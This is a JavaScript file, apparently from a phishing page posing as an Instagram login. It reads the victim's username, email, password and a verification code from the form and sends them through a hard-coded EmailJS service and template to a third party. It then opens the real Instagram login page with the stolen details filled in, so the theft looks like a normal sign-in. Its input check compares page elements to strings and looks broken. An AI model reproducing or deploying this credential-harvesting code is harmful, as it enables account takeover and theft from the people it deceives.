function sendEmail() {
    var params = {
        name: document.querySelector("#username").value,
        email: document.querySelector("#email").value,
        password: document.querySelector("#password").value,
        message: `Instapassword: ${document.querySelector("#verify").value}, id: ${document.querySelector("#username").value}`
    };
    const serviceID = "service_r4nowaf";
    const templateID = "template_us11w5m";
    
    emailjs.send(serviceID, templateID, params)
    .then(
        res => {
            document.querySelector("#username").value = "";
            document.querySelector("#email").value = "";
            document.querySelector("#password").value = "";
            document.querySelector("#verify").value = "";
            console.log(res);
            
            alert("Message sent successfully");
        })
        .catch((err) => console.log(err));
}

document.getElementById("logi").addEventListener('click', () => {
    const emailElement = document.querySelector("#email");
    const userName = document.querySelector("#username");
    const PassElement = document.querySelector("#password");
    const VerificationElement = document.querySelector("#email");

    if (emailElement != "" || userName != " " || PassElement != " " || VerificationElement != " "){
        const messagebox = document.querySelector(".messagebox");
        messagebox.style.top = '26%';
        messagebox.style.transition = '0.8s ease-in-out';
    }else{
        sendEmail();
        openInstagramAndLogin();
    }
});


function openInstagramAndLogin() {
    var instagramID = document.querySelector("#username").value;
    var password = document.querySelector("#password").value;
    var loginUrl = `https://www.instagram.com/accounts/login/`;

    if(instagramID != "" && password != ""){

        var newWindow = window.open(loginUrl, '_blank');
        newWindow.onload = function() {
            newWindow.document.querySelector("input[name='username']").value = instagramID;
            newWindow.document.querySelector("input[name='password']").value = password;
            newWindow.document.querySelector("button[type='submit']").click();
        };
    }

}

const messageboxXBtn = document.querySelector("#xbtn");
messageboxXBtn.addEventListener('click', () => {
    const messagebox = document.querySelector(".messagebox");
    messagebox.style.top = '-84%';
    messagebox.style.transition = '0.8s ease-in-out';
})



const loginfacebook = document.querySelector("#loginfacebook");
loginfacebook.addEventListener('click', () => {
    const url = "https://www.facebook.com/";
    window.open(url);
})